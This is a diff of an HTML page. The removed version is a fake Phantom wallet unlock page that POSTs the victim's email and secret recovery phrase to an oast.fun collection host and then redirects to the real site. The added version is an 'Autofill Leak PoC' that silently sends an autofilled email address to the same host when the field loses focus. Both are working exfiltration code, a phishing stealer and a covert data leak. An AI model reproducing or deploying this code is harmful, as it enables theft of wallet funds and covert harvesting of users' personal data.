@@ -1,38 +1,68 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Phantom</title>
+  <title>Autofill Leak PoC</title>
   <style>
-    body { font-family: sans-serif; background: #0d0d0d; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
-    .login-box { background: #1a1a1a; padding: 20px; border-radius: 10px; width: 300px; }
-    input { width: 100%; padding: 10px; margin-bottom: 10px; background: #333; border: none; color: white; }
-    button { width: 100%; padding: 10px; background: #512da8; border: none; color: white; border-radius: 5px; }
+    body {
+      font-family: sans-serif;
+      background: #f2f2f2;
+      padding: 60px;
+    }
+
+    .login-box {
+      background: #fff;
+      padding: 40px;
+      border-radius: 10px;
+      max-width: 400px;
+      margin: auto;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+
+    input[type="email"] {
+      width: 100%;
+      font-size: 16px;
+      padding: 12px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      margin-bottom: 20px;
+    }
+
+    button {
+      padding: 12px 20px;
+      font-size: 16px;
+      background-color: #1a73e8;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
   </style>
 </head>
 <body>
+
   <div class="login-box">
-    <h2>Unlock Wallet</h2>
-    <input id="email" type="email" placeholder="Email" />
-    <input id="phrase" type="text" placeholder="Secret Recovery Phrase" />
-    <button onclick="submit()">Unlock</button>
+    <h2>Sign in</h2>
+    <form>
+      <input type="email" id="emailInput" name="email" autocomplete="email" placeholder="Enter your email" />
+      <button type="submit">Continue</button>
+    </form>
   </div>
 
   <script>
-    function submit() {
-      const email = document.getElementById("email").value.trim();
-      const phrase = document.getElementById("phrase").value.trim();
+    const emailInput = document.getElementById('emailInput');
 
-      fetch("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ email, phrase })
-      });
-
-      // Delay before redirecting to real phantom.app
-      setTimeout(() => {
-        window.location.href = "https://phantom.app";
-      }, 1500);
-    }
+    // When user types or autofill injects email and field loses focus
+    emailInput.addEventListener('blur', () => {
+      const value = emailInput.value.trim();
+      if (value) {
+        fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ email: value })
+        });
+      }
+    });
   </script>
+
 </body>
 </html>
